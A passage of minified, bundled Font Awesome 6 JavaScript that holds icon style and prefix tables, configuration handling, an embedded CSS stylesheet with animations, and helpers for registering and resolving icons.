        fasr: "fa-regular",
        fasl: "fa-light",
        fast: "fa-thin"
    },
    "sharp-duotone": {
        fasds: "fa-solid"
    }
}
  , o4 = {
    classic: {
        solid: "fas",
        regular: "far",
        light: "fal",
        thin: "fat",
        duotone: "fad",
        brands: "fab"
    },
    sharp: {
        solid: "fass",
        regular: "fasr",
        light: "fasl",
        thin: "fast"
    },
    "sharp-duotone": {
        solid: "fasds"
    }
}
  , Jg = {
    classic: {
        fa: "solid",
        fas: "solid",
        "fa-solid": "solid",
        far: "regular",
        "fa-regular": "regular",
        fal: "light",
        "fa-light": "light",
        fat: "thin",
        "fa-thin": "thin",
        fad: "duotone",
        "fa-duotone": "duotone",
        fab: "brands",
        "fa-brands": "brands"
    },
    sharp: {
        fa: "solid",
        fass: "solid",
        "fa-solid": "solid",
        fasr: "regular",
        "fa-regular": "regular",
        fasl: "light",
        "fa-light": "light",
        fast: "thin",
        "fa-thin": "thin"
    },
    "sharp-duotone": {
        fa: "solid",
        fasds: "solid",
        "fa-solid": "solid"
    }
}
  , i4 = ["solid", "regular", "light", "thin", "duotone", "brands"]
  , Zg = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
  , s4 = Zg.concat([11, 12, 13, 14, 15, 16, 17, 18, 19, 20])
  , Oo = {
    GROUP: "duotone-group",
    SWAP_OPACITY: "swap-opacity",
    PRIMARY: "primary",
    SECONDARY: "secondary"
}
  , l4 = [...Object.keys(r4), ...i4, "2xs", "xs", "sm", "lg", "xl", "2xl", "beat", "border", "fade", "beat-fade", "bounce", "flip-both", "flip-horizontal", "flip-vertical", "flip", "fw", "inverse", "layers-counter", "layers-text", "layers", "li", "pull-left", "pull-right", "pulse", "rotate-180", "rotate-270", "rotate-90", "rotate-by", "shake", "spin-pulse", "spin-reverse", "spin", "stack-1x", "stack-2x", "stack", "ul", Oo.GROUP, Oo.SWAP_OPACITY, Oo.PRIMARY, Oo.SECONDARY].concat(Zg.map(e => "".concat(e, "x"))).concat(s4.map(e => "w-".concat(e)))
  , u4 = {
    "Font Awesome Kit": {
        400: "fak",
        normal: "fak"
    },
    "Font Awesome Kit Duotone": {
        400: "fakd",
        normal: "fakd"
    }
}
  , c4 = {
    kit: {
        "fa-kit": "fak"
    }
}
  , f4 = {
    kit: {
        fak: "fa-kit"
    }
}
  , ch = {
    kit: {
        kit: "fak"
    },
    "kit-duotone": {
        "kit-duotone": "fakd"
    }
};
const Jn = "___FONT_AWESOME___"
  , jc = 16
  , e1 = "fa"
  , t1 = "svg-inline--fa"
  , ua = "data-fa-i2svg"
  , Ec = "data-fa-pseudo-element"
  , d4 = "data-fa-pseudo-element-pending"
  , Jf = "data-prefix"
  , Zf = "data-icon"
  , fh = "fontawesome-i2svg"
  , p4 = "async"
  , h4 = ["HTML", "HEAD", "STYLE", "SCRIPT"]
  , n1 = ( () => {
    try {
        return !0
    } catch {
        return !1
    }
}
)()
  , r1 = [ht, un, cn];
function Si(e) {
    return new Proxy(e,{
        get(t, n) {
            return n in t ? t[n] : t[ht]
        }
    })
}
const a1 = {
    ...Jg
};
a1[ht] = {
    ...Jg[ht],
    ...uh.kit,
    ...uh["kit-duotone"]
};
const ea = Si(a1)
  , _c = {
    ...o4
};
_c[ht] = {
    ..._c[ht],
    ...ch.kit,
    ...ch["kit-duotone"]
};
const di = Si(_c)
  , Tc = {
    ...a4
};
Tc[ht] = {
    ...Tc[ht],
    ...f4.kit
};
const ta = Si(Tc)
  , Pc = {
    ...n4
};
Pc[ht] = {
    ...Pc[ht],
    ...c4.kit
};
const m4 = Si(Pc)
  , g4 = Jb
  , o1 = "fa-layers-text"
  , y4 = Zb
  , v4 = {
    ...Xb
};
Si(v4);
const x4 = ["class", "data-prefix", "data-icon", "data-fa-transform", "data-fa-mask"]
  , mu = Oo
  , Xa = new Set;
Object.keys(di[ht]).map(Xa.add.bind(Xa));
Object.keys(di[un]).map(Xa.add.bind(Xa));
Object.keys(di[cn]).map(Xa.add.bind(Xa));
const w4 = [...qb, ...l4]
  , $o = Tr.FontAwesomeConfig || {};
function b4(e) {
    var t = lt.querySelector("script[" + e + "]");
    if (t)
        return t.getAttribute(e)
}
function S4(e) {
    return e === "" ? !0 : e === "false" ? !1 : e === "true" ? !0 : e
}
lt && typeof lt.querySelector == "function" && [["data-family-prefix", "familyPrefix"], ["data-css-prefix", "cssPrefix"], ["data-family-default", "familyDefault"], ["data-style-default", "styleDefault"], ["data-replacement-class", "replacementClass"], ["data-auto-replace-svg", "autoReplaceSvg"], ["data-auto-add-css", "autoAddCss"], ["data-auto-a11y", "autoA11y"], ["data-search-pseudo-elements", "searchPseudoElements"], ["data-observe-mutations", "observeMutations"], ["data-mutate-approach", "mutateApproach"], ["data-keep-original-source", "keepOriginalSource"], ["data-measure-performance", "measurePerformance"], ["data-show-missing-icons", "showMissingIcons"]].forEach(t => {
    let[n,r] = t;
    const a = S4(b4(n));
    a != null && ($o[r] = a)
}
);
const i1 = {
    styleDefault: "solid",
    familyDefault: "classic",
    cssPrefix: e1,
    replacementClass: t1,
    autoReplaceSvg: !0,
    autoAddCss: !0,
    autoA11y: !0,
    searchPseudoElements: !1,
    observeMutations: !0,
    mutateApproach: "async",
    keepOriginalSource: !0,
    measurePerformance: !1,
    showMissingIcons: !0
};
$o.familyPrefix && ($o.cssPrefix = $o.familyPrefix);
const qa = {
    ...i1,
    ...$o
};
qa.autoReplaceSvg || (qa.observeMutations = !1);
const fe = {};
Object.keys(i1).forEach(e => {
    Object.defineProperty(fe, e, {
        enumerable: !0,
        set: function(t) {
            qa[e] = t,
            Ho.forEach(n => n(fe))
        },
        get: function() {
            return qa[e]
        }
    })
}
);
Object.defineProperty(fe, "familyPrefix", {
    enumerable: !0,
    set: function(e) {
        qa.cssPrefix = e,
        Ho.forEach(t => t(fe))
    },
    get: function() {
        return qa.cssPrefix
    }
});
Tr.FontAwesomeConfig = fe;
const Ho = [];
function N4(e) {
    return Ho.push(e),
    () => {
        Ho.splice(Ho.indexOf(e), 1)
    }
}
const ur = jc
  , In = {
    size: 16,
    x: 0,
    y: 0,
    rotate: 0,
    flipX: !1,
    flipY: !1
};
function C4(e) {
    if (!e || !nr)
        return;
    const t = lt.createElement("style");
    t.setAttribute("type", "text/css"),
    t.innerHTML = e;
    const n = lt.head.childNodes;
    let r = null;
    for (let a = n.length - 1; a > -1; a--) {
        const o = n[a]
          , i = (o.tagName || "").toUpperCase();
        ["STYLE", "LINK"].indexOf(i) > -1 && (r = o)
    }
    return lt.head.insertBefore(t, r),
    e
}
const k4 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
function pi() {
    let e = 12
      , t = "";
    for (; e-- > 0; )
        t += k4[Math.random() * 62 | 0];
    return t
}
function io(e) {
    const t = [];
    for (let n = (e || []).length >>> 0; n--; )
        t[n] = e[n];
    return t
}
function ed(e) {
    return e.classList ? io(e.classList) : (e.getAttribute("class") || "").split(" ").filter(t => t)
}
function s1(e) {
    return "".concat(e).replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/'/g, "&#39;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
}
function j4(e) {
    return Object.keys(e || {}).reduce( (t, n) => t + "".concat(n, '="').concat(s1(e[n]), '" '), "").trim()
}
function _l(e) {
    return Object.keys(e || {}).reduce( (t, n) => t + "".concat(n, ": ").concat(e[n].trim(), ";"), "")
}
function td(e) {
    return e.size !== In.size || e.x !== In.x || e.y !== In.y || e.rotate !== In.rotate || e.flipX || e.flipY
}
function E4(e) {
    let {transform: t, containerWidth: n, iconWidth: r} = e;
    const a = {
        transform: "translate(".concat(n / 2, " 256)")
    }
      , o = "translate(".concat(t.x * 32, ", ").concat(t.y * 32, ") ")
      , i = "scale(".concat(t.size / 16 * (t.flipX ? -1 : 1), ", ").concat(t.size / 16 * (t.flipY ? -1 : 1), ") ")
      , s = "rotate(".concat(t.rotate, " 0 0)")
      , u = {
        transform: "".concat(o, " ").concat(i, " ").concat(s)
    }
      , c = {
        transform: "translate(".concat(r / 2 * -1, " -256)")
    };
    return {
        outer: a,
        inner: u,
        path: c
    }
}
function _4(e) {
    let {transform: t, width: n=jc, height: r=jc, startCentered: a=!1} = e
      , o = "";
    return a && Xg ? o += "translate(".concat(t.x / ur - n / 2, "em, ").concat(t.y / ur - r / 2, "em) ") : a ? o += "translate(calc(-50% + ".concat(t.x / ur, "em), calc(-50% + ").concat(t.y / ur, "em)) ") : o += "translate(".concat(t.x / ur, "em, ").concat(t.y / ur, "em) "),
    o += "scale(".concat(t.size / ur * (t.flipX ? -1 : 1), ", ").concat(t.size / ur * (t.flipY ? -1 : 1), ") "),
    o += "rotate(".concat(t.rotate, "deg) "),
    o
}
var T4 = `:root, :host {
  --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Free";
  --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Free";
  --fa-font-light: normal 300 1em/1 "Font Awesome 6 Pro";
  --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Pro";
  --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
  --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
  --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-thin: normal 100 1em/1 "Font Awesome 6 Sharp";
  --fa-font-sharp-duotone-solid: normal 900 1em/1 "Font Awesome 6 Sharp Duotone";
}

svg:not(:root).svg-inline--fa, svg:not(:host).svg-inline--fa {
  overflow: visible;
  box-sizing: content-box;
}

.svg-inline--fa {
  display: var(--fa-display, inline-block);
  height: 1em;
  overflow: visible;
  vertical-align: -0.125em;
}
.svg-inline--fa.fa-2xs {
  vertical-align: 0.1em;
}
.svg-inline--fa.fa-xs {
  vertical-align: 0em;
}
.svg-inline--fa.fa-sm {
  vertical-align: -0.0714285705em;
}
.svg-inline--fa.fa-lg {
  vertical-align: -0.2em;
}
.svg-inline--fa.fa-xl {
  vertical-align: -0.25em;
}
.svg-inline--fa.fa-2xl {
  vertical-align: -0.3125em;
}
.svg-inline--fa.fa-pull-left {
  margin-right: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-pull-right {
  margin-left: var(--fa-pull-margin, 0.3em);
  width: auto;
}
.svg-inline--fa.fa-li {
  width: var(--fa-li-width, 2em);
  top: 0.25em;
}
.svg-inline--fa.fa-fw {
  width: var(--fa-fw-width, 1.25em);
}

.fa-layers svg.svg-inline--fa {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
}

.fa-layers-counter, .fa-layers-text {
  display: inline-block;
  position: absolute;
  text-align: center;
}

.fa-layers {
  display: inline-block;
  height: 1em;
  position: relative;
  text-align: center;
  vertical-align: -0.125em;
  width: 1em;
}
.fa-layers svg.svg-inline--fa {
  transform-origin: center center;
}

.fa-layers-text {
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  transform-origin: center center;
}

.fa-layers-counter {
  background-color: var(--fa-counter-background-color, #ff253a);
  border-radius: var(--fa-counter-border-radius, 1em);
  box-sizing: border-box;
  color: var(--fa-inverse, #fff);
  line-height: var(--fa-counter-line-height, 1);
  max-width: var(--fa-counter-max-width, 5em);
  min-width: var(--fa-counter-min-width, 1.5em);
  overflow: hidden;
  padding: var(--fa-counter-padding, 0.25em 0.5em);
  right: var(--fa-right, 0);
  text-overflow: ellipsis;
  top: var(--fa-top, 0);
  transform: scale(var(--fa-counter-scale, 0.25));
  transform-origin: top right;
}

.fa-layers-bottom-right {
  bottom: var(--fa-bottom, 0);
  right: var(--fa-right, 0);
  top: auto;
  transform: scale(var(--fa-layers-scale, 0.25));
  transform-origin: bottom right;
}

.fa-layers-bottom-left {
  bottom: var(--fa-bottom, 0);
  left: var(--fa-left, 0);
  right: auto;
  top: auto;
  transform: scale(var(--fa-layers-scale, 0.25));
  transform-origin: bottom left;
}

.fa-layers-top-right {
  top: var(--fa-top, 0);
  right: var(--fa-right, 0);
  transform: scale(var(--fa-layers-scale, 0.25));
  transform-origin: top right;
}

.fa-layers-top-left {
  left: var(--fa-left, 0);
  right: auto;
  top: var(--fa-top, 0);
  transform: scale(var(--fa-layers-scale, 0.25));
  transform-origin: top left;
}

.fa-1x {
  font-size: 1em;
}

.fa-2x {
  font-size: 2em;
}

.fa-3x {
  font-size: 3em;
}

.fa-4x {
  font-size: 4em;
}

.fa-5x {
  font-size: 5em;
}

.fa-6x {
  font-size: 6em;
}

.fa-7x {
  font-size: 7em;
}

.fa-8x {
  font-size: 8em;
}

.fa-9x {
  font-size: 9em;
}

.fa-10x {
  font-size: 10em;
}

.fa-2xs {
  font-size: 0.625em;
  line-height: 0.1em;
  vertical-align: 0.225em;
}

.fa-xs {
  font-size: 0.75em;
  line-height: 0.0833333337em;
  vertical-align: 0.125em;
}

.fa-sm {
  font-size: 0.875em;
  line-height: 0.0714285718em;
  vertical-align: 0.0535714295em;
}

.fa-lg {
  font-size: 1.25em;
  line-height: 0.05em;
  vertical-align: -0.075em;
}

.fa-xl {
  font-size: 1.5em;
  line-height: 0.0416666682em;
  vertical-align: -0.125em;
}

.fa-2xl {
  font-size: 2em;
  line-height: 0.03125em;
  vertical-align: -0.1875em;
}

.fa-fw {
  text-align: center;
  width: 1.25em;
}

.fa-ul {
  list-style-type: none;
  margin-left: var(--fa-li-margin, 2.5em);
  padding-left: 0;
}
.fa-ul > li {
  position: relative;
}

.fa-li {
  left: calc(-1 * var(--fa-li-width, 2em));
  position: absolute;
  text-align: center;
  width: var(--fa-li-width, 2em);
  line-height: inherit;
}

.fa-border {
  border-color: var(--fa-border-color, #eee);
  border-radius: var(--fa-border-radius, 0.1em);
  border-style: var(--fa-border-style, solid);
  border-width: var(--fa-border-width, 0.08em);
  padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
}

.fa-pull-left {
  float: left;
  margin-right: var(--fa-pull-margin, 0.3em);
}

.fa-pull-right {
  float: right;
  margin-left: var(--fa-pull-margin, 0.3em);
}

.fa-beat {
  animation-name: fa-beat;
  animation-delay: var(--fa-animation-delay, 0s);
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 1s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-bounce {
  animation-name: fa-bounce;
  animation-delay: var(--fa-animation-delay, 0s);
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 1s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
}

.fa-fade {
  animation-name: fa-fade;
  animation-delay: var(--fa-animation-delay, 0s);
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 1s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-beat-fade {
  animation-name: fa-beat-fade;
  animation-delay: var(--fa-animation-delay, 0s);
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 1s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
}

.fa-flip {
  animation-name: fa-flip;
  animation-delay: var(--fa-animation-delay, 0s);
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 1s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, ease-in-out);
}

.fa-shake {
  animation-name: fa-shake;
  animation-delay: var(--fa-animation-delay, 0s);
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 1s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin {
  animation-name: fa-spin;
  animation-delay: var(--fa-animation-delay, 0s);
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 2s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, linear);
}

.fa-spin-reverse {
  --fa-animation-direction: reverse;
}

.fa-pulse,
.fa-spin-pulse {
  animation-name: fa-spin;
  animation-direction: var(--fa-animation-direction, normal);
  animation-duration: var(--fa-animation-duration, 1s);
  animation-iteration-count: var(--fa-animation-iteration-count, infinite);
  animation-timing-function: var(--fa-animation-timing, steps(8));
}

@media (prefers-reduced-motion: reduce) {
  .fa-beat,
.fa-bounce,
.fa-fade,
.fa-beat-fade,
.fa-flip,
.fa-pulse,
.fa-shake,
.fa-spin,
.fa-spin-pulse {
    animation-delay: -1ms;
    animation-duration: 1ms;
    animation-iteration-count: 1;
    transition-delay: 0s;
    transition-duration: 0s;
  }
}
@keyframes fa-beat {
  0%, 90% {
    transform: scale(1);
  }
  45% {
    transform: scale(var(--fa-beat-scale, 1.25));
  }
}
@keyframes fa-bounce {
  0% {
    transform: scale(1, 1) translateY(0);
  }
  10% {
    transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
  }
  30% {
    transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
  }
  50% {
    transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
  }
  57% {
    transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
  }
  64% {
    transform: scale(1, 1) translateY(0);
  }
  100% {
    transform: scale(1, 1) translateY(0);
  }
}
@keyframes fa-fade {
  50% {
    opacity: var(--fa-fade-opacity, 0.4);
  }
}
@keyframes fa-beat-fade {
  0%, 100% {
    opacity: var(--fa-beat-fade-opacity, 0.4);
    transform: scale(1);
  }
  50% {
    opacity: 1;
    transform: scale(var(--fa-beat-fade-scale, 1.125));
  }
}
@keyframes fa-flip {
  50% {
    transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
  }
}
@keyframes fa-shake {
  0% {
    transform: rotate(-15deg);
  }
  4% {
    transform: rotate(15deg);
  }
  8%, 24% {
    transform: rotate(-18deg);
  }
  12%, 28% {
    transform: rotate(18deg);
  }
  16% {
    transform: rotate(-22deg);
  }
  20% {
    transform: rotate(22deg);
  }
  32% {
    transform: rotate(-12deg);
  }
  36% {
    transform: rotate(12deg);
  }
  40%, 100% {
    transform: rotate(0deg);
  }
}
@keyframes fa-spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
.fa-rotate-90 {
  transform: rotate(90deg);
}

.fa-rotate-180 {
  transform: rotate(180deg);
}

.fa-rotate-270 {
  transform: rotate(270deg);
}

.fa-flip-horizontal {
  transform: scale(-1, 1);
}

.fa-flip-vertical {
  transform: scale(1, -1);
}

.fa-flip-both,
.fa-flip-horizontal.fa-flip-vertical {
  transform: scale(-1, -1);
}

.fa-rotate-by {
  transform: rotate(var(--fa-rotate-angle, 0));
}

.fa-stack {
  display: inline-block;
  vertical-align: middle;
  height: 2em;
  position: relative;
  width: 2.5em;
}

.fa-stack-1x,
.fa-stack-2x {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0;
  z-index: var(--fa-stack-z-index, auto);
}

.svg-inline--fa.fa-stack-1x {
  height: 1em;
  width: 1.25em;
}
.svg-inline--fa.fa-stack-2x {
  height: 2em;
  width: 2.5em;
}

.fa-inverse {
  color: var(--fa-inverse, #fff);
}

.sr-only,
.fa-sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.sr-only-focusable:not(:focus),
.fa-sr-only-focusable:not(:focus) {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border-width: 0;
}

.svg-inline--fa .fa-primary {
  fill: var(--fa-primary-color, currentColor);
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa .fa-secondary {
  fill: var(--fa-secondary-color, currentColor);
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-primary {
  opacity: var(--fa-secondary-opacity, 0.4);
}

.svg-inline--fa.fa-swap-opacity .fa-secondary {
  opacity: var(--fa-primary-opacity, 1);
}

.svg-inline--fa mask .fa-primary,
.svg-inline--fa mask .fa-secondary {
  fill: black;
}

.fad.fa-inverse,
.fa-duotone.fa-inverse {
  color: var(--fa-inverse, #fff);
}`;
function l1() {
    const e = e1
      , t = t1
      , n = fe.cssPrefix
      , r = fe.replacementClass;
    let a = T4;
    if (n !== e || r !== t) {
        const o = new RegExp("\\.".concat(e, "\\-"),"g")
          , i = new RegExp("\\--".concat(e, "\\-"),"g")
          , s = new RegExp("\\.".concat(t),"g");
        a = a.replace(o, ".".concat(n, "-")).replace(i, "--".concat(n, "-")).replace(s, ".".concat(r))
    }
    return a
}
let dh = !1;
function gu() {
    fe.autoAddCss && !dh && (C4(l1()),
    dh = !0)
}
var P4 = {
    mixout() {
        return {
            dom: {
                css: l1,
                insertCss: gu
            }
        }
    },
    hooks() {
        return {
            beforeDOMElementCreation() {
                gu()
            },
            beforeI2svg() {
                gu()
            }
        }
    }
};
const Zn = Tr || {};
Zn[Jn] || (Zn[Jn] = {});
Zn[Jn].styles || (Zn[Jn].styles = {});
Zn[Jn].hooks || (Zn[Jn].hooks = {});
Zn[Jn].shims || (Zn[Jn].shims = []);
var Mn = Zn[Jn];
const u1 = []
  , c1 = function() {
    lt.removeEventListener("DOMContentLoaded", c1),
    Js = 1,
    u1.map(e => e())
};
let Js = !1;
nr && (Js = (lt.documentElement.doScroll ? /^loaded|^c/ : /^loaded|^i|^c/).test(lt.readyState),
Js || lt.addEventListener("DOMContentLoaded", c1));
function O4(e) {
    nr && (Js ? setTimeout(e, 0) : u1.push(e))
}
function Ni(e) {
    const {tag: t, attributes: n={}, children: r=[]} = e;
    return typeof e == "string" ? s1(e) : "<".concat(t, " ").concat(j4(n), ">").concat(r.map(Ni).join(""), "</").concat(t, ">")
}
function ph(e, t, n) {
    if (e && e[t] && e[t][n])
        return {
            prefix: t,
            iconName: n,
            icon: e[t][n]
        }
}
var yu = function(t, n, r, a) {
    var o = Object.keys(t), i = o.length, s = n, u, c, f;
    for (r === void 0 ? (u = 1,
    f = t[o[0]]) : (u = 0,
    f = r); u < i; u++)
        c = o[u],
        f = s(f, t[c], c, t);
    return f
};
function R4(e) {
    const t = [];
    let n = 0;
    const r = e.length;
    for (; n < r; ) {
        const a = e.charCodeAt(n++);
        if (a >= 55296 && a <= 56319 && n < r) {
            const o = e.charCodeAt(n++);
            (o & 64512) == 56320 ? t.push(((a & 1023) << 10) + (o & 1023) + 65536) : (t.push(a),
            n--)
        } else
            t.push(a)
    }
    return t
}
function Oc(e) {
    const t = R4(e);
    return t.length === 1 ? t[0].toString(16) : null
}
function A4(e, t) {
    const n = e.length;
    let r = e.charCodeAt(t), a;
    return r >= 55296 && r <= 56319 && n > t + 1 && (a = e.charCodeAt(t + 1),
    a >= 56320 && a <= 57343) ? (r - 55296) * 1024 + a - 56320 + 65536 : r
}
function hh(e) {
    return Object.keys(e).reduce( (t, n) => {
        const r = e[n];
        return !!r.icon ? t[r.iconName] = r.icon : t[n] = r,
        t
    }
    , {})
}
function Rc(e, t) {
    let n = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {};
    const {skipHooks: r=!1} = n
      , a = hh(t);
    typeof Mn.hooks.addPack == "function" && !r ? Mn.hooks.addPack(e, hh(t)) : Mn.styles[e] = {
        ...Mn.styles[e] || {},
        ...a
    },
    e === "fas" && Rc("fa", t)
}
const {styles: Vr, shims: L4} = Mn
  , I4 = {
    [ht]: Object.values(ta[ht]),
    [un]: Object.values(ta[un]),
    [cn]: Object.values(ta[cn])
};
let nd = null
  , f1 = {}
  , d1 = {}
  , p1 = {}
  , h1 = {}
  , m1 = {};
const M4 = {
    [ht]: Object.keys(ea[ht]),
    [un]: Object.keys(ea[un]),
    [cn]: Object.keys(ea[cn])
};
function D4(e) {
    return ~w4.indexOf(e)
}
function z4(e, t) {
    const n = t.split("-")
      , r = n[0]
      , a = n.slice(1).join("-");
    return r === e && a !== "" && !D4(a) ? a : null
}
const g1 = () => {
    const e = r => yu(Vr, (a, o, i) => (a[i] = yu(o, r, {}),
    a), {});
    f1 = e( (r, a, o) => (a[3] && (r[a[3]] = o),
    a[2] && a[2].filter(s => typeof s == "number").forEach(s => {
        r[s.toString(16)] = o
    }
    ),
    r)),
    d1 = e( (r, a, o) => (r[o] = o,
    a[2] && a[2].filter(s => typeof s == "string").forEach(s => {
        r[s] = o
    }
    ),
    r)),
    m1 = e( (r, a, o) => {
        const i = a[2];
        return r[o] = o,
        i.forEach(s => {
            r[s] = o
        }
        ),
        r
    }
    );
    const t = "far"in Vr || fe.autoFetchSvg
      , n = yu(L4, (r, a) => {
        const o = a[0];
        let i = a[1];
        const s = a[2];
        return i === "far" && !t && (i = "fas"),
        typeof o == "string" && (r.names[o] = {
            prefix: i,
            iconName: s
        }),
        typeof o == "number" && (r.unicodes[o.toString(16)] = {
            prefix: i,
            iconName: s
        }),
        r
    }
    , {
        names: {},
        unicodes: {}
    });
    p1 = n.names,
    h1 = n.unicodes,
    nd = Tl(fe.styleDefault, {
        family: fe.familyDefault
    })
}
;
N4(e => {
    nd = Tl(e.styleDefault, {
        family: fe.familyDefault
    })
}
);
g1();
function rd(e, t) {
    return (f1[e] || {})[t]
}
function F4(e, t) {
    return (d1[e] || {})[t]
}
function vr(e, t) {
    return (m1[e] || {})[t]
}
function y1(e) {
    return p1[e] || {
        prefix: null,
        iconName: null
    }
}
function U4(e) {
    const t = h1[e]
      , n = rd("fas", e);
    return t || (n ? {
        prefix: "fas",
        iconName: n
    } : null) || {
        prefix: null,
        iconName: null
    }
}
function Pr() {
    return nd
}
const ad = () => ({
    prefix: null,
    iconName: null,
    rest: []
});
function Tl(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {family: n=ht} = t
      , r = ea[n][e]
      , a = di[n][e] || di[n][r]
      , o = e in Mn.styles ? e : null;
    return a || o || null
}
const B4 = {
    [ht]: Object.keys(ta[ht]),
    [un]: Object.keys(ta[un]),
    [cn]: Object.keys(ta[cn])
};
function Pl(e) {
    let t = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    const {skipLookups: n=!1} = t
      , r = {
        [ht]: "".concat(fe.cssPrefix, "-").concat(ht),
        [un]: "".concat(fe.cssPrefix, "-").concat(un),
        [cn]: "".concat(fe.cssPrefix, "-").concat(cn)
    };
    let a = null
      , o = ht;
    const i = Qb.filter(u => u !== qg);
    i.forEach(u => {
        (e.includes(r[u]) || e.some(c => B4[u].includes(c))) && (o = u)
    }
    );
    const s = e.reduce( (u, c) => {
        const f = z4(fe.cssPrefix, c);
        if (Vr[c] ? (c = I4[o].includes(c) ? m4[o][c] : c,
        a = c,
        u.prefix = c) : M4[o].indexOf(c) > -1 ? (a = c,
        u.prefix = Tl(c, {
            family: o
        })) : f ? u.iconName = f : c !== fe.replacementClass && !i.some(d => c === r[d]) && u.rest.push(c),
        !n && u.prefix && u.iconName) {
            const d = a === "fa" ? y1(u.iconName) : {}
              , h = vr(u.prefix, u.iconName);
            d.prefix && (a = null),
            u.iconName = d.iconName || h || u.iconName,
            u.prefix = d.prefix || u.prefix,
            u.prefix === "far" && !Vr.far && Vr.fas && !fe.autoFetchSvg && (u.prefix = "fas")
        }
        return u
    }
    , ad());
    return (e.includes("fa-brands") || e.includes("fab")) && (s.prefix = "fab"),
    (e.includes("fa-duotone") || e.includes("fad")) && (s.prefix = "fad"),
    !s.prefix && o === un && (Vr.fass || fe.autoFetchSvg) && (s.prefix = "fass",
    s.iconName = vr(s.prefix, s.iconName) || s.iconName),
    !s.prefix && o === cn && (Vr.fasds || fe.autoFetchSvg) && (s.prefix = "fasds",
    s.iconName = vr(s.prefix, s.iconName) || s.iconName),
    (s.prefix === "fa" || a === "fa") && (s.prefix = Pr() || "fas"),
    s
}
class $4 {
    constructor() {
        this.definitions = {}
    }
    add() {
        for (var t = arguments.length, n = new Array(t), r = 0; r < t; r++)
            n[r] = arguments[r];
        const a = n.reduce(this._pullDefinitions, {});
        Object.keys(a).forEach(o => {
            this.definitions[o] = {
                ...this.definitions[o] || {},
                ...a[o]
            },
            Rc(o, a[o]);
            const i = ta[ht][o];
            i && Rc(i, a[o]),
            g1()
        }
        )
    }
    reset() {
        this.definitions = {}
    }
    _pullDefinitions(t, n) {
        const r = n.prefix && n.iconName && n.icon ? {
            0: n
        } : n;
        return Object.keys(r).map(a => {
            const {prefix: o, iconName: i, icon: s} = r[a]
              , u = s[2];
            t[o] || (t[o] = {}),
            u.length > 0 && u.forEach(c => {
                typeof c == "string" && (t[o][c] = s)
            }
            ),
            t[o][i] = s
        }
        ),
        t
    }
}
let mh = []
  , Aa = {};
const Ba = {}
  , H4 = Object.keys(Ba);
function V4(e, t) {
    let {mixoutsTo: n} = t;
    return mh = e,
    Aa = {},
    Object.keys(Ba).forEach(r => {
        H4.indexOf(r) === -1 && delete Ba[r]
